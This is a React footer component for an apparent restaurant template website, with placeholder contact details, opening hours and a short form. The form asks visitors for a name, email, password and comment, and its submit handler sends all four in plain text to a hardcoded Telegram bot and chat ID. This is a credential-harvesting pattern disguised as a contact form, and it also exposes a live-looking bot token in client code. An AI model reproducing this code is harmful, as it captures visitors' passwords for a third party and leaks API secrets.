import React, { useState } from 'react';
import './Footer.css'
import { useTranslation } from 'react-i18next';

function Footer() {
  const {t,i18n}=useTranslation()

    const [data, setData] = useState({    name: "",    email: "",password: "",comment: ""
    });
  
    const handleChange = (e) => {
      const { name, value } = e.target;
      setData((prevData) => ({
        ...prevData,
        [name]: value,
      }));
    };
  
    const handleSubmit = (e) => {
      e.preventDefault();
      if (!data.name || !data.email || !data.password || !data.comment) {
        alert("Please enter a name and phone number.");
        return;
      }
  
      const telegramToken = "7195045460:AAEuv5X8DKUb3wTC2zKBlFr-oj-bUrnldSQ";
      const chatId = '542984937';
      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
      const data1 = new URLSearchParams({
        chat_id: chatId,
       text: `Name: ${data.name}\nEmail: ${data.email}\nPassword: ${data.password}\nComment: ${data.comment}`,
      });
  
      fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: data1,
      })
        .then((response) => response.json())
        .then((data) => {
          console.log("Message sent:", data);
          alert("Message sent successfully!");
        })
        .catch((error) => {
          console.error("Error:", error);
          alert("Failed to send message.");
        });
    };
    return (
        <div className='aaa'>
            <div className="mini-sec1">
                <h2>{t('FooterH2')}</h2>
                <div className="pustoooo"></div>
                <p className='rrrr'>112-Legere ancillae vix ne.
Te elit putent propriae eum,
aliquip nominati</p>
<div className="pusy"></div>
                <p>phone: 00 000 000</p>
                <div className="ppp"></div>
                <p>Email: support@templatemela.com</p>
            </div>
            <div className="mini-sec3">
                <h2>{t('FooterH2')}</h2>
                <div className="p"></div>
                <h3>{t('FooterH3')}</h3>
                <div className="pppp"></div>
                <p>8:00am to 10:00pm(Breakfast)</p>
                <div className="ppp"></div>
                <p>11:00am to 10:00pm(Lunch/Diner)</p>
                <div className="pppp"></div>
                <h3>{t('FooterH32')}</h3>
                <div className="pppp"></div>
                <p>10:00am to 11:00pm(Brunch)</p>
                <div className="ppp"></div>
                <p>11:00am to 12:00pm(Lunch/Dinner)</p>
            </div>
            <div className="mini-sec2">
                <h2>{t('FooterH2')}</h2>
                <form onSubmit={handleSubmit}>
                <div className="pus"></div>
                <input type="text" placeholder='First Name' name='name'
                value={data.name} onChange={handleChange}/>
                <div className="pus"></div>
                <input type="email" placeholder='Email' name='email'
                value={data.email} onChange={handleChange}/>
                <div className="pus"></div>
                <input type="number" placeholder='Password' name='password'
                value={data.password} onChange={handleChange}/>
                <div className="pus"></div>
                <input type="text" className='input-big' placeholder='Comment' name='comment'
                value={data.comment} onChange={handleChange}/>
                <div className="pus"></div>
                <button>{t('Sec2BTN')}</button>
                </form>
            </div>
            
        </div>
    );
}

export default Footer;